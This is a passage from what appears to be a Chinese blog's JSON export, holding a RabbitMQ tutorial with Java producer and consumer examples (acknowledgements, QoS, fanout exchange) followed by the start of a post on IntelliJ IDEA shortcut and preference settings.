ACK机制：Rabbitmq提供了交付确认机制，可以设定自动确认交付和手动确认交付。消费者消费消息时的<code>channel.basicConsume</code>方法，第二个参数<code>autoAck</code>为<code>true</code>时表示自动确认交付，为<code>false</code>时表示手动确认交付。自动确认交付模式下，消费者从队列消费消息时立即确认交付，这时队列中立即完全删除该消息。手动确认交付模式下，客户端需告诉服务端是否确认交付，共有三种交付状态：ACK、NACK、REJECT，当客户端发送ACK时表示客户端处理成功，这时Rabbitmq才会完全删除，ACK的调用为<code>channel.basicAck(deliveryTag, false)</code>。当客户端发送NACK和REJECT时均表示交付失败，区别时NACK能批量操作，REJECT的调用为<code>channel.basicReject(deliveryTag, false)</code>，NACK的调用为<code>channel.basicNack(deliveryTag, true, true)</code>，NACK和REJECT的最后一个参数均表示交付失败的是否重新进入队列，ACK和NACK的第二个参数均表示是否包含所有未回复的交付（即是否批量回复）。</p>\n<p>​        TRANSACTION机制：Rabbitmq在AMQP协议下提供了事务机制，客户端使用<code>channel.txSelect()</code>方法开启事务，使用<code>channel.txCommit()</code>方法提交事务，使用<code>channel.txRollback()</code>方法回滚事务。该机制是重量级的，并且不是必要的，根据官网的说法，它将导致吞吐量降低250倍，因此官方后面添加了也能保证数据不丢失的ACK机制。</p>\n<h3 id=\"QOS\"><a href=\"#QOS\" class=\"headerlink\" title=\"QOS\"></a>QOS</h3><p>默认情况下，消费者一次会尽可能多的消费消息（根据客户端内存），设置QOS可以指定一次最高的消费量，可以使用<code>channel.basicQos(prefetchCount)</code>方法来设置。</p>\n<h2 id=\"7-可视化界面\"><a href=\"#7-可视化界面\" class=\"headerlink\" title=\"7. 可视化界面\"></a>7. 可视化界面</h2><p><code>rabbitmq-plugins enable rabbitmq_management</code>命令用于开启可视化管理界面，之后添加有该权限的用户即可访问15672端口使用 </p>\n<h2 id=\"8-JAVA访问测试\"><a href=\"#8-JAVA访问测试\" class=\"headerlink\" title=\"8. JAVA访问测试\"></a>8. JAVA访问测试</h2><p>POM依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;com.rabbitmq&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;amqp-client&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;5.6.0&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"简单HelloWorld\"><a href=\"#简单HelloWorld\" class=\"headerlink\" title=\"简单HelloWorld\"></a>简单HelloWorld</h3><p>基于默认交换机，且不设QOS</p>\n<p>生产者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.rabbitmq.client.Channel;</span><br><span class=\"line\">import com.rabbitmq.client.Connection;</span><br><span class=\"line\">import com.rabbitmq.client.ConnectionFactory;</span><br><span class=\"line\">public class Send &#123;</span><br><span class=\"line\">    private final static String QUEUE_NAME = &quot;hello&quot;,</span><br><span class=\"line\">\t\t\tROUTING_KEY = QUEUE_NAME;</span><br><span class=\"line\">\tprivate static ConnectionFactory factory;</span><br><span class=\"line\">\tprivate static Connection conn;</span><br><span class=\"line\">\tprivate static synchronized Channel createConnectChannel() &#123;</span><br><span class=\"line\">\t\tif (factory == null) &#123;</span><br><span class=\"line\">\t\t\tfactory = new ConnectionFactory();</span><br><span class=\"line\">\t\t\tfactory.setHost(&quot;118.25.54.197&quot;);</span><br><span class=\"line\">\t\t\tfactory.setVirtualHost(&quot;test&quot;);</span><br><span class=\"line\">\t\t\tfactory.setUsername(System.getProperty(&quot;username&quot;));</span><br><span class=\"line\">\t\t\tfactory.setPassword(System.getProperty(&quot;password&quot;));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif (conn == null) &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tconn = factory.newConnection();</span><br><span class=\"line\">\t\t\t&#125; catch(Exception e) &#123;</span><br><span class=\"line\">\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tChannel channel = conn.createChannel();</span><br><span class=\"line\">\t\t\treturn channel;</span><br><span class=\"line\">\t\t&#125; catch (Exception e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tthrow new RuntimeException(&quot;create failed&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static void closeChannel(Channel channel) &#123;</span><br><span class=\"line\">\t\tif (channel == null || !channel.isOpen()) return;</span><br><span class=\"line\">\t\tsynchronized (channel) &#123;</span><br><span class=\"line\">\t\t\tif (channel.isOpen()) &#123;</span><br><span class=\"line\">\t\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\t\tchannel.close();</span><br><span class=\"line\">\t\t\t\t&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t&#125; catch (TimeoutException e) &#123;</span><br><span class=\"line\">\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static synchronized void closeConnection(Channel channel) &#123;</span><br><span class=\"line\">\t\tcloseChannel(channel);</span><br><span class=\"line\">\t\tif (conn != null &amp;&amp; conn.isOpen()) &#123;</span><br><span class=\"line\">\t\t\tsynchronized (conn) &#123;</span><br><span class=\"line\">\t\t\t\tif (conn != null &amp;&amp; conn.isOpen()) &#123;</span><br><span class=\"line\">\t\t\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\t\t\tconn.close();</span><br><span class=\"line\">\t\t\t\t\t\tconn = null;</span><br><span class=\"line\">\t\t\t\t\t&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\t\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    public static void main(String[] argv) throws Exception &#123;</span><br><span class=\"line\">        Channel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\tSystem.out.println(declare);</span><br><span class=\"line\">\t\tString message = &quot;Hello World...&quot;;</span><br><span class=\"line\">\t\tchannel.basicPublish(&quot;&quot;, ROUTING_KEY, null, message.getBytes());</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [x] Sent &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">\t\tcloseConnection(channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>消费者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.rabbitmq.client.Channel;</span><br><span class=\"line\">import com.rabbitmq.client.Connection;</span><br><span class=\"line\">import com.rabbitmq.client.ConnectionFactory;</span><br><span class=\"line\">import com.rabbitmq.client.DeliverCallback;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Recv &#123;</span><br><span class=\"line\">    private final static String QUEUE_NAME = &quot;hello&quot;;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    public static void main(String[] argv) throws Exception &#123;</span><br><span class=\"line\">        Channel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [*] Waiting for messages. To exit press CTRL+C&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch cdl = new CountDownLatch(1);</span><br><span class=\"line\">\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -&gt; &#123;</span><br><span class=\"line\">            String message = new String(delivery.getBody(), &quot;UTF-8&quot;);</span><br><span class=\"line\">            System.out.println(&quot; [x] Received &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">            cdl.countDown();</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        channel.basicConsume(QUEUE_NAME, true, deliverCallback, consumerTag -&gt; &#123; &#125;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        cdl.await();</span><br><span class=\"line\">        closeConnection(channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"多个消费者\"><a href=\"#多个消费者\" class=\"headerlink\" title=\"多个消费者\"></a>多个消费者</h3><p>基于设QOS且存在ACK的情况</p>\n<p>生产者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitQueueProducer &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tScanner sc = new Scanner(System.in);</span><br><span class=\"line\">\t\tString nextLine = sc.nextLine();</span><br><span class=\"line\">\t\tsc.close();</span><br><span class=\"line\">\t\tif (!nextLine.contains(&quot;.&quot;)) nextLine += &quot;.&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tString message = String.join(&quot;&quot;, nextLine);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.basicPublish(&quot;&quot;, QUEUE_NAME, MessageProperties.PERSISTENT_TEXT_PLAIN, message.getBytes());</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [x] Sent &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">\t\tcloseConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>消费者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitQueueConsumer &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tprivate static SimpleDateFormat sdf = new SimpleDateFormat(&quot;HH:mm:ss.SSS&quot;);</span><br><span class=\"line\">\tprivate static void doWork(String task) &#123;</span><br><span class=\"line\">\t\tfor (char ch : task.toCharArray()) &#123;</span><br><span class=\"line\">\t\t\tif (ch == &apos;.&apos;) &#123;</span><br><span class=\"line\">\t\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\t\tThread.sleep(1000l);</span><br><span class=\"line\">\t\t\t\t&#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t\tThread.currentThread().interrupt();</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; </span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, InterruptedException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\tThread.sleep(4000l);</span><br><span class=\"line\">\t\tchannel.basicQos(1);</span><br><span class=\"line\">\t\tCountDownLatch cdl = new CountDownLatch(1);</span><br><span class=\"line\">\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -&gt; &#123;</span><br><span class=\"line\">            String message = new String(delivery.getBody(), &quot;UTF-8&quot;);</span><br><span class=\"line\">            long deliveryTag = delivery.getEnvelope().getDeliveryTag();</span><br><span class=\"line\">            System.out.println(&quot; [!] Delivery TAG &apos;&quot; + deliveryTag + &quot;&apos;&quot;);</span><br><span class=\"line\">            System.out.println(&quot; [x] Received &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">            \tdoWork(message);</span><br><span class=\"line\">            &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            \tSystem.out.println(&quot; [x] Done&quot;);</span><br><span class=\"line\">            \tchannel.basicNack(delivery.getEnvelope().getDeliveryTag(), false, false);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            boolean ack = Math.random() &gt; 0.5;</span><br><span class=\"line\">            System.out.println(&quot; [a] ACK &apos;&quot; + ack + &quot;&apos; &quot; + sdf.format(new Date()));</span><br><span class=\"line\">            if (ack) &#123;</span><br><span class=\"line\">            \tchannel.basicAck(deliveryTag, false);</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">            \tchannel.basicNack(deliveryTag, false, true);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            cdl.countDown();</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        System.out.println(&quot; [*] Waiting for messages  &quot; + sdf.format(new Date()));</span><br><span class=\"line\">        channel.basicConsume(QUEUE_NAME, false, deliverCallback, consumerTag -&gt; &#123;</span><br><span class=\"line\">        \tSystem.out.println(&quot; [x] Cancel &apos;&quot; + consumerTag + &quot;&apos;&quot;);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        cdl.await();</span><br><span class=\"line\">        closeConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Fanout\"><a href=\"#Fanout\" class=\"headerlink\" title=\"Fanout\"></a>Fanout</h3><p>生产者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitFanoutProducer &#123;\t</span><br><span class=\"line\">\tprivate final static String EXCHANGE_NAME = &quot;fanout&quot;;</span><br><span class=\"line\">\tprivate final static String ROUTING_KEY = &quot;&quot;;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tScanner sc = new Scanner(System.in);</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [!] Enter Message&quot;);</span><br><span class=\"line\">\t\tString nextLine = sc.nextLine();</span><br><span class=\"line\">\t\tsc.close();</span><br><span class=\"line\">\t\tif (!nextLine.contains(&quot;.&quot;)) nextLine += &quot;.&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tString message = String.join(&quot;&quot;, nextLine);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.basicPublish(EXCHANGE_NAME, ROUTING_KEY, null, message.getBytes());</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [x] Sent &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">\t\tcloseConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>消费者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class RabbitFanoutConsumer &#123;</span><br><span class=\"line\">\tprivate final static String EXCHANGE_NAME = &quot;fanout&quot;;</span><br><span class=\"line\">\tprivate final static String ROUTING_KEY = &quot;&quot;;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, InterruptedException &#123;</span><br><span class=\"line\">\t\tChannel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tScanner sc = new Scanner(System.in);</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [!] Enter Queue Name&quot;);</span><br><span class=\"line\">\t\tString queueName = sc.nextLine();</span><br><span class=\"line\">\t\tsc.close();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.queueDeclare(queueName, false, false, false, null);</span><br><span class=\"line\">\t\tchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT);</span><br><span class=\"line\">\t\tchannel.queueBind(queueName, EXCHANGE_NAME, ROUTING_KEY);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [*] Waiting for messages. To exit press CTRL+C&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch cdl = new CountDownLatch(3);</span><br><span class=\"line\">\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -&gt; &#123;</span><br><span class=\"line\">            String message = new String(delivery.getBody(), &quot;UTF-8&quot;);</span><br><span class=\"line\">            </span><br><span class=\"line\">            System.out.println(&quot; [x] Received &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">            cdl.countDown();</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        channel.basicConsume(queueName, true, deliverCallback, consumerTag -&gt; &#123; &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\">        cdl.await();</span><br><span class=\"line\">        closeConnection(channel);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"IDEA配置经验与问题解决","date":"2019-05-18T02:32:33.000Z","keywords":"idea, 快捷键, 配置","rId":"MB-19051801","_content":"\n##  快捷键偏好设置\n\n1. 查找(Keymap -> Main Menu -> Edit -> Find -> Find...) ：Ctrl + F    【速记：find】 \n2. 复制上一行到下一行(Keymap -> Edit Actions -> Duplicate Entire Lines) ： Ctrl + 向下箭头 \n3. 移动代码到上一行(Keymap -> Main Menu -> Code -> Move Statement Up) ： Alt + 向上箭头 \n4. 移动代码到下一行(Keymap -> Main Menu -> Code -> Move Statement Down) ： Alt + 向下箭头 \n5. 删除一行(Keymap -> Editor Actions -> Delete Line) ： Ctrl + D    【速记：delete】 \n6. 调出代码提示(Keymap -> Main Menu -> Code -> Completion -> Basic) ： Alt + / \n7. 自动补全返回变量(Keymap -> Main Menu -> Refactor -> Extract -> Variable...) ： Alt + Enter \n8. 显示代码在哪里被使用(Keymap -> Main Menu -> Edit -> Find -> Find Usages) ： Ctrl + U     【速记：Usage】 \n9. 代码格式化(Keymap -> Main Menu -> Code -> Reformat Code) ：Ctrl + Shift + F    【速记：format】 \n10. 重命名(Keymap -> Main Menu -> Refactor -> Rename...) ： Alt + Shift + R    【速记：refact】 \n11. 全局查找(Keymap -> Main Menu -> Edit -> Find -> Find in Path...)：Ctrl + P    【速记：path】 \n12. 返回或前进到上次光标所在处(Keymap -> Main Menu -> Navigate -> Back / Forward)：Alt + 向左箭头/向右箭头\n13. 显示层级关系(Keymap -> Main Menu -> Navigate -> Type Hierarchy)：Ctrl + H    【速记：hierarchy】 \n14. 定位到继承代码(Keymap -> Main Menu -> Navigate -> Implementation(s))：Ctrl + Alt + Button1 Click\n15. 定位到声明代码(Keymap -> Main Menu -> Navigate -> Declaration)：Ctrl + Button1 Click\n16. 删除Java文件不用的依赖(Keymap -> Main Menu -> Code -> Optimize Imports)：Ctrl + Shift + O\n17. 显示参数列表(Keymap  -> Main Menu -> View -> Parameter Info)：Alt + P    【速记：parameter】 \n\n18. 取消双击shift更改为其他键(双击shift -> Actions)：输入registry... >> 其后选择点击`registry...`项 >> 找到`ide.suppress.double.click.handler`键名，右边打勾禁止双击shift处理 >> close >> 设置新快捷键(File => Settings... -> Keymap -> Other -> Search Everywhere不是文件夹项)：Ctrl + W    【速记：watch或where】 \n\nCTRL为基础组合键，与ALT相关的组合键通常是代码修改的辅助有关\n\n## 其他偏好设置\n\n1. 鼠标悬浮方法上方显示文档(Editor -> General => Show quick documentation on mouse move) ：打勾 \n\n2. 自动为Java文件添加明确的导入依赖(Editor -> General -> Auto Import => Add unambiguous imports on the fly)：打勾\n\n3. 自动补全中显示字段名称提示(Editor -> General -> Code Completion => Parameter => Show parameter name hints on completion)：打勾\n\n4. 方法常量变量显示参数名称提示(Editor -> General -> Appearance => Show parameter name hints)：打勾 >> 点开右边Configure配置页面，Language选Java，Do not开头的取消打勾，Show开头的打勾\n\n5. 显示链式调用方法的参数提示(Editor -> General -> Appearance => Show chain call type hints)：打勾\n\n6. 自动提示中显示文档（与参数列表择一足矣）(Editor-> General -> Code Completion => Show the Documentation popup in 1000 ms)：打勾\n\n7. 代码字体大小调大到14(Editor -> Font -> Size)\n\n8. Idea插件：CodeGlance（缩略图）、Rainbow Brackets（彩色括号）\n\n9. 新项目默认编码设置(File => Other Settings => Settings for New Projects... -> Editor -> File Encodings => Global Encoding和Project Encoding)：UTF-8        [已创建的项目，在File => Project Structure...设置]\n\n10. 新项目默认JDK设置(File => Other Settings => Structure for New Projects... -> Project Settings -> Platform Settings)：点击加号添加jdk，其后 >>  设置版本(Project Settings -> Project => Project SDK)：选择环境及默认版本级别        [已创建的项目，在File => Project Structure...设置]\n\n11. 行代码显示最后提交信息[Other Settings -> Git ToolBox Global => General -> Show editor inline 'Blame']：打勾（需要Git ToolBox插件）\n\n12. 方法之间显示分割线[Editor -> General -> Appearance => Show method separator]：打勾\n\n13. 文件头注释模板：File Header(Editor -> File and Code Templates -> Includes -> File Header)\n\n    ```\n    /**\n     *\n     * @Author: Vince\n     * @Date: ${DATE} ${TIME}\n     */\n    ```\n\n14. 通过特殊字符触发的方法注释模板(Editor -> Live Templates)：右边加号新加一个Template Group与Live Template\n\n   ![MB19051801-1](../static/MB19051801-1.png)\n\n   Abbreviation框填入`*`，Expand with选择回车，TemplateText填入生成的字符串\n\n   ```\n   *\n    * \n   $PARAM$\n    * @return : $RETURN$\n    * @author : Vince\n    * @date : $DATE$ $TIME$\n    */\n   ```\n\n   字符串中包含`$PARAM$`、`$RETURN$`、`$DATE$`、`$TIME$`等变量，点击`Edit variables`编辑变量如下\n\n   ![MB19051801-2](../static/MB19051801-2.png)\n\n   其中PARAM使用groovy脚本添加参数\n\n   ```\n   groovyScript(\"def result=''; def params=\\\"${_1}\\\".replaceAll('[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]', '').split(',').toList(); for(i = 0; i < params.size(); i++) {result+=' * @param ' + params[i] + ((i < params.size() - 1) ? '\\\\n':'')}; return result\", methodParameters())\n   ```\n\n   \n\n## 操作教程\n\n1. **修改快捷键**\n\nFile => Settings... => Keymap页面中：搜索输入框用于输入匹配文字搜索，输入框右侧按钮用于输入快捷键搜索。修改快捷键时，点击修改项，悬浮框中可选择设置键盘快捷键触发、设置鼠标配合Ctrl等键触发、缩写触发\n\n2. 